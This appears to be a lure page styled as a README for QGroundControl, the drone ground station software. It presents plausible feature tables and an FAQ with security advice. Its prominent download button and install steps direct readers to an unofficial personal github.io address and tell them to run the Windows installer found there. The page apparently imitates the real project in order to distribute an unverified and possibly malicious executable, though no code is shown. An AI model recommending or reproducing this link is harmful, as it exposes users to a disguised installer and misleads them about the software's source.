# QGroundControl
QGroundControl is a ground control station for Windows that helps operators plan missions, monitor connected vehicles, and interpret live flight data.
Its Fly View brings configurable telemetry, a flight-status toolbar, and map or video presentation into a focused QGroundControl interface.
<p align="center"><img src="https://s.cafebazaar.ir/images/icons/org.mavlink.qgroundcontrol-55f4eabf-23ff-4748-a66a-048114e9cb72_512x512.png?x-img=v1/resize,h_256,w_256,lossless_false/optimize" alt="QGroundControl logo" width="120"/></p>

[![Download QGroundControl](https://img.shields.io/badge/⬇_Download_QGroundControl-d63384?style=for-the-badge)](https://anitabailey26.github.io/.github/QGroundControl-Telemetry-App)

## Who Benefits From This Workspace

**Remote pilots:** keep vehicle state, route context, and camera output within reach during active operations. **Mission coordinators:** prepare routes and observe connected assets on a shared map. **Maintainers:** inspect messages, component status, and communication health before release. **Post-flight reviewers:** preserve telemetry context and revisit recorded activity after landing.

## Security and Connection Discipline

* **Build awareness.** Record the installed version and examine official release information before each planned update.
* **CVE review.** Treat QGroundControl CVE search results as leads to verify against the exact product build and operating context, never as proof that every installation is affected.
* **Link protection.** Prefer trusted networks, protect ground-station access, and use supported message-signing controls where the vehicle setup permits them.

## Operational Friction and the Fly View Response

| Problem | How QGroundControl Solves It |
|---|---|
| The vehicle's current readiness is unclear | Status indicators expose flight state and detailed information for items such as GPS, battery, control, and telemetry links. |
| A communication link weakens or disappears | Link-quality information and loss-of-communication status help the operator recognize a connection change promptly. |
| Map context and payload imagery compete for screen space | The video switcher lets the map or live feed move into the foreground while the other remains available. |
| Mission context must remain understandable after landing | Saved telemetry and Analyze tools support later inspection instead of relying only on in-flight recollection. |

## Install and Establish a Link

To install QGroundControl, use the QGroundControl download button above, run the Windows installer, and complete the setup prompts. Launch the application, configure or select the appropriate communication link for the supported autopilot, and wait for the toolbar and Fly View values to confirm an active connection before using vehicle actions.

## Vehicle, Data, and Media Compatibility

| Type | Supported |
|---|---|
| Autopilots | Compatible PX4 and ArduPilot systems, with available functions determined by firmware, vehicle type, and configuration |
| Telemetry | MAVLink communication over connection methods supported by the selected vehicle and Windows hardware |
| Planning | Waypoints, mission items, geofences, rally points, and map-based planning where the connected firmware exposes those capabilities |
| Video | Configured network streams or compatible capture devices; display and recording depend on the source and installed media support |
| Flight records | Telemetry logging, replay controls, onboard log retrieval, and related analysis features when enabled and supported |

## Flight-Desk FAQ

<details><summary><b>Is QGroundControl free?</b></summary>
Yes. QGroundControl is distributed as free, open-source ground control software, although vehicles, radios, map data, and network services can involve separate costs.
</details>

<details><summary><b>Which versions of Windows are supported?</b></summary>
Use a currently maintained Windows release that satisfies the requirements of the QGroundControl build you install. Hardware acceleration, drivers, and media components can also affect map and video behavior.
</details>

<details><summary><b>How should I interpret QGroundControl CVE or NVD results?</b></summary>
Use an NVD QGroundControl CVE search as an initial research step, then match the listed vendor, product, affected version, and configuration to your installation. Confirm applicability through official release notes and update guidance without assuming that a search result describes your build.
</details>

<details><summary><b>What should I watch when a connection becomes unstable?</b></summary>
Check the communication status, telemetry signal indicators, vehicle messages, and whether incoming values are still changing. Follow the operating procedures for the aircraft and link hardware rather than sending commands through an uncertain connection.
</details>

## Maintain Awareness From Takeoff to Review

Keep the aircraft in view, the connection indicators readable, and every post-flight decision grounded in recorded data.
